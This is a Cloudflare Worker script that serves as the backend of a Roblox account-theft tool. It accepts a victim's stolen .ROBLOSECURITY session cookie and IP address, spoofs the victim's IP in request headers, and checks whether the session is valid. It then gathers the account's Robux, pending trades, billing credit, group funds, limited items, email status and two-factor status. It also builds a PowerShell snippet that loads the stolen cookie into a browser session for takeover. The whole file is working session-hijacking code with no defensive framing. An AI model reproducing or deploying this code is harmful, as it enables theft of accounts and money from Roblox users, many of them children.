// Cloudflare Worker — fetches Roblox info + builds PowerShell
// https://holy-truth-3129.notrllyme133.workers.dev/
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const cors = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type'
  };
  if (request.method === 'OPTIONS') return new Response(null, { status: 204, headers: cors });
  if (request.method !== 'POST')   return jsonRes({ error: 'POST only' }, 405, cors);

  let body;
  try { body = await request.json(); } catch {
    return jsonRes({ error: 'Invalid JSON' }, 400, cors);
  }

  const { cookie, victimIp, lite } = body;
  if (!cookie) return jsonRes({ error: 'cookie required' }, 400, cors);

  try {
    if (lite) {
      const h = makeHeaders(cookie, victimIp || '');

      // Auth + robux + avatar — all 3 in parallel
      const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', { headers: h });
      if (!authRes.ok) return jsonRes({ valid: false }, 200, cors);
      const auth = await authRes.json();
      const uid  = auth.id;

      const [robuxRes, avatarRes, pendingRes] = await Promise.all([
        fetch('https://economy.roblox.com/v1/user/currency', { headers: h }),
        fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${uid}&size=150x150&format=Webp`, {}),
        fetch(`https://trades.roblox.com/v1/trades/inbound?limit=25&sortOrder=Asc`, { headers: h }).catch(() => null)
      ]);

      const robuxData  = robuxRes.ok   ? await robuxRes.json()   : null;
      const avatarData = avatarRes.ok  ? await avatarRes.json()  : null;

      let pendingRobux = 0;
      if (pendingRes?.ok) {
        const pd = await pendingRes.json();
        pendingRobux = pd.data?.reduce((sum, t) =>
          sum + (t.offers?.find(o => o.user?.id !== uid)?.robux || 0), 0) || 0;
      }

      return jsonRes({
        valid:        true,
        id:           uid,
        username:     auth.name,
        displayName:  auth.displayName,
        robux:        robuxData?.robux || 0,
        pendingRobux,
        avatarUrl:    avatarData?.data?.[0]?.imageUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png'
      }, 200, cors);
    }

    const result = await fetchAll(cookie, victimIp || '');
    return jsonRes(result, 200, cors);
  } catch (err) {
    return jsonRes({ valid: false, error: err.message }, 200, cors);
  }
}

function jsonRes(data, status, headers = {}) {
  return new Response(JSON.stringify(data), {
    status, headers: { 'Content-Type': 'application/json', ...headers }
  });
}

function makeHeaders(cookie, victimIp) {
  const h = {
    'Cookie':          `.ROBLOSECURITY=${cookie}`,
    'User-Agent':      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Accept':          'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Referer':         'https://www.roblox.com/',
    'Origin':          'https://www.roblox.com'
  };
  if (victimIp) { h['X-Forwarded-For'] = victimIp; h['X-Real-IP'] = victimIp; }
  return h;
}

function buildPowerShell(cookie) {
  const escaped = cookie.replace(/"/g, '`"').replace(/'/g, "''");
  return `$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
$session.Cookies.Add((New-Object System.Net.Cookie(".ROBLOSECURITY", "${escaped}", "/", "roblox.com")))
Invoke-WebRequest -UseBasicParsing -Uri "https://www.roblox.com/home" \`
-WebSession $session \`
-Headers @{
  "authority"="www.roblox.com"
  "accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
  "accept-language"="en-US,en;q=0.9"
  "cache-control"="max-age=0"
  "referer"="https://www.roblox.com/"
  "sec-ch-ua"='"Not_A Brand";v="8", "Chromium";v="124", "Google Chrome";v="124"'
  "sec-ch-ua-mobile"="?0"
  "sec-ch-ua-platform"='"Windows"'
  "sec-fetch-dest"="document"
  "sec-fetch-mode"="navigate"
  "sec-fetch-site"="same-origin"
  "sec-fetch-user"="?1"
  "upgrade-insecure-requests"="1"
}`;
}

async function checkGamepass(uid, gpId, h) {
  try {
    const r = await fetch(`https://inventory.roblox.com/v1/users/${uid}/items/GamePass/${gpId}`, { headers: h });
    if (!r.ok) return false;
    const d = await r.json();
    return d.data?.length > 0;
  } catch { return false; }
}

async function fetchAll(cookie, victimIp) {
  const h = makeHeaders(cookie, victimIp);

  const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', { headers: h });
  if (!authRes.ok) return { valid: false, powershell: buildPowerShell(cookie), error: 'Cookie invalid or expired' };
  const auth = await authRes.json();
  const uid  = auth.id;
  if (!uid) return { valid: false, powershell: buildPowerShell(cookie), error: 'No user id' };

  const [
    profileRes, robuxRes, friendsRes, premiumRes,
    billingRes, emailRes, groupsRes, limitedsRes,
    avatarRes, tfaRes,
    txDayRes, txWeekRes, txYearRes
  ] = await Promise.all([
    fetch(`https://users.roblox.com/v1/users/${uid}`,                                                        { headers: h }),
    fetch('https://economy.roblox.com/v1/user/currency',                                                     { headers: h }),
    fetch(`https://friends.roblox.com/v1/users/${uid}/friends/count`,                                        { headers: h }),
    fetch(`https://premiumfeatures.roblox.com/v1/users/${uid}/validate-membership`,                           { headers: h }),
    fetch('https://billing.roblox.com/v1/credit',                                                            { headers: h }),
    fetch('https://accountsettings.roblox.com/v1/email',                                                     { headers: h }),
    fetch(`https://groups.roblox.com/v1/users/${uid}/groups/roles`,                                          { headers: h }),
    fetch(`https://inventory.roblox.com/v1/users/${uid}/assets/collectibles?limit=100&sortOrder=Desc`,        { headers: h }),
    fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${uid}&size=150x150&format=Webp`,  {}),
    fetch(`https://twostepverification.roblox.com/v1/users/${uid}/configuration`,                             { headers: h }).catch(() => null),
    fetch(`https://economy.roblox.com/v2/users/${uid}/transaction-totals?timeFrame=Day&transactionType=summary`,  { headers: h }),
    fetch(`https://economy.roblox.com/v2/users/${uid}/transaction-totals?timeFrame=Week&transactionType=summary`, { headers: h }),
    fetch(`https://economy.roblox.com/v2/users/${uid}/transaction-totals?timeFrame=Year&transactionType=summary`, { headers: h }),
  ]);

  const profile      = profileRes.ok  ? await profileRes.json()  : null;
  const robuxData    = robuxRes.ok     ? await robuxRes.json()    : null;
  const friendsData  = friendsRes.ok   ? await friendsRes.json()  : null;
  const isPremium    = premiumRes.ok   ? await premiumRes.json()  : false;
  const billingData  = billingRes.ok   ? await billingRes.json()  : null;
  const emailData    = emailRes.ok     ? await emailRes.json()    : null;
  const groupsData   = groupsRes.ok    ? await groupsRes.json()   : { data: [] };
  const limitedsData = limitedsRes.ok  ? await limitedsRes.json() : { data: [] };
  const avatarData   = avatarRes.ok    ? await avatarRes.json()   : null;
  const tfaData      = tfaRes?.ok      ? await tfaRes.json()      : null;
  const txDay        = txDayRes.ok     ? await txDayRes.json()    : null;
  const txWeek       = txWeekRes.ok    ? await txWeekRes.json()   : null;
  const txYear       = txYearRes.ok    ? await txYearRes.json()   : null;

  const accountAgeDays = profile?.created
    ? Math.floor((Date.now() - new Date(profile.created).getTime()) / 86400000)
    : 'N/A';

  const groups      = groupsData.data || [];
  const ownedGroups = groups.filter(g => g.role?.rank === 255);
  let groupRobux = 0, groupPending = 0;
  for (const g of ownedGroups.slice(0, 3)) {
    try {
      const [cr, pr] = await Promise.all([
        fetch(`https://economy.roblox.com/v1/groups/${g.group.id}/currency`, { headers: h }),
        fetch(`https://economy.roblox.com/v2/groups/${g.group.id}/transactions?transactionType=pending&limit=10`, { headers: h })
      ]);
      if (cr.ok) { const c = await cr.json(); groupRobux   += c.robux || 0; }
      if (pr.ok) { const p = await pr.json(); groupPending += p.data?.reduce((a, t) => a + (t.currency?.amount || 0), 0) || 0; }
    } catch (_) {}
  }

  let pendingRobux = 0;
  try {
    const pendingRes = await fetch(`https://trades.roblox.com/v1/trades/inbound?limit=25&sortOrder=Asc`, { headers: h });
    if (pendingRes.ok) {
      const pendingData = await pendingRes.json();
      pendingRobux = pendingData.data?.reduce((sum, t) =>
        sum + (t.offers?.find(o => o.user?.id !== uid)?.robux || 0), 0) || 0;
    }
  } catch (_) {}

  const limiteds      = limitedsData.data || [];
  const limitedsValue = limiteds.reduce((s, i) => s + (i.recentAveragePrice || 0), 0);
  const limitedNames  = limiteds.map(i => i.name || '').filter(Boolean);
  const hasHeadless   = limitedNames.some(n => n.toLowerCase().includes('headless'));
  const hasKorblox    = limitedNames.some(n => n.toLowerCase().includes('korblox'));

  const [mm2, adoptMe, plsDonate] = await Promise.all([
    checkGamepass(uid, '17510307', h),
    checkGamepass(uid, '33135930', h),
    checkGamepass(uid, '12345678', h)
  ]);

  return {
    valid:         true,
    id:            uid,
    username:      auth.name,
    displayName:   auth.displayName,
    isPremium:     isPremium === true,
    accountAgeDays,
    robux:         robuxData?.robux     || 0,
    pendingRobux,
    txDay:         txDay?.incomingRobuxTotal   ?? 0,
    txWeek:        txWeek?.incomingRobuxTotal  ?? 0,
    txYear:        txYear?.incomingRobuxTotal  ?? 0,
    friends:       friendsData?.count   || 0,
    credit:        billingData?.balance || 0,
    groupsOwned:   ownedGroups.length,
    groupRobux,
    groupPending,
    limitedsCount: limiteds.length,
    limitedsValue,
    limitedNames,
    hasHeadless,
    hasKorblox,
    emailSet:      emailData?.emailAddress ? 'Set \u2705'      : 'Not Set \u274c',
    emailVerified: emailData?.verified     ? 'Verified \u2705' : 'Unverified \u274c',
    twoFA:         tfaData?.methods?.length > 0 ? 'Enabled \u2705' : 'Disabled \u274c',
    gamepasses:    { mm2, adoptMe, plsDonate },
    avatarUrl:     avatarData?.data?.[0]?.imageUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png',
    powershell:    buildPowerShell(cookie)
  };
}
